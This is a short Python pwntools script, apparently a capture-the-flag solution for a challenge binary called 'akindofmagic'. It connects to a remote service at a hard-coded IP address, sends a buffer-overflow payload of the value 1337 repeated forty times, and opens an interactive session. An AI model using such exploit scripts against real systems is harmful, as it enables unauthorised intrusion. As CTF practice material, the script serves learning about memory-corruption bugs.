from pwn import *

if __name__ == "__main__":
    #io = process('./akindofmagic')
    io = remote('143.198.184.186', 5000)
    io.sendline(p32(1337)*40)
    io.interactive()
